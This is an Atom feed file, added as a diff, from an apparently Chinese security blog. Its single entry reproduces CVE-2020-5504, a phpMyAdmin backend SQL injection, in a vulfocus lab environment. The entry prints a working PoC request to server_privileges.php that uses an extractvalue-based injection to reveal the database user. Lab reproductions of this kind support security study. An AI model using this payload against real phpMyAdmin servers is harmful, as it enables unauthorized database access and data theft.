@@ -1,0 +1,42 @@
+<?xml version="1.0"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>https://ch1e.gitee.io</id>
+    <title>ch1e的随笔 • Posts by &#34;sql注入&#34; tag</title>
+    <link href="https://ch1e.gitee.io" />
+    <updated>2021-10-21T06:10:08.079Z</updated>
+    <category term="CTF" />
+    <category term="靶场练习" />
+    <category term="web安全" />
+    <category term="免杀" />
+    <category term="渗透测试" />
+    <category term="数据库" />
+    <category term="代码审计" />
+    <category term="C++" />
+    <category term="漏洞复现" />
+    <category term="SQL注入" />
+    <category term="红队钓鱼" />
+    <category term="远程代码执行" />
+    <category term="内网渗透" />
+    <category term="网络协议" />
+    <entry>
+        <id>https://ch1e.gitee.io/2021/10/21/phpmyadmin1/</id>
+        <title>phpmyadmin 后台sql注入漏洞复现（CVE-2020-5504）</title>
+        <link rel="alternate" href="https://ch1e.gitee.io/2021/10/21/phpmyadmin1/"/>
+        <content type="html">&lt;h1 id=&#34;phpmyadmin-后台sql注入漏洞复现（CVE-2020-5504）&#34;&gt;&lt;a href=&#34;#phpmyadmin-后台sql注入漏洞复现（CVE-2020-5504）&#34; class=&#34;headerlink&#34; title=&#34;phpmyadmin 后台sql注入漏洞复现（CVE-2020-5504）&#34;&gt;&lt;/a&gt;phpmyadmin 后台sql注入漏洞复现（CVE-2020-5504）&lt;/h1&gt;&lt;h1 id=&#34;影响版本&#34;&gt;&lt;a href=&#34;#影响版本&#34; class=&#34;headerlink&#34; title=&#34;影响版本&#34;&gt;&lt;/a&gt;&lt;strong&gt;影响版本&lt;/strong&gt;&lt;/h1&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Phpmyadmin &amp;lt;= 5.00&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Phpmyadmin &amp;lt;= 4.94&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;h1 id=&#34;漏洞复现&#34;&gt;&lt;a href=&#34;#漏洞复现&#34; class=&#34;headerlink&#34; title=&#34;漏洞复现&#34;&gt;&lt;/a&gt;&lt;strong&gt;漏洞复现&lt;/strong&gt;&lt;/h1&gt;&lt;p&gt;复现地址:&lt;a href=&#34;http://vulfocus.fofa.so/&#34;&gt;http://vulfocus.fofa.so/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20211021141143985.png&#34; alt=&#34;image-20211021141143985&#34;&gt;&lt;/p&gt;
+&lt;p&gt;拿到环境使用给出的账号密码进入后台，开启Burpsuite抓包，获取到一个token，保存下来&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20211021141220287.png&#34; alt=&#34;image-20211021141220287&#34;&gt;&lt;/p&gt;
+&lt;p&gt;直接将请求的地址替换成poc即可。poc如下，记得需要替换token&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;server_privileges.php?ajax_request=true&amp;amp;validate_username=1&amp;amp;username=1&amp;#x27;and extractvalue(1,concat(0x7e,(select user()),0x7e))--+db=&amp;amp;token=3c7c5b2b7f3a7621394d6c733e35705f&amp;amp;viewing_mode=server&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20211021141407302.png&#34; alt=&#34;image-20211021141407302&#34;&gt;&lt;/p&gt;
+</content>
+        <category term="靶场练习" />
+        <category term="web安全" />
+        <category term="漏洞复现" />
+        <category term="SQL注入" />
+        <updated>2021-10-21T06:10:08.079Z</updated>
+    </entry>
+</feed>
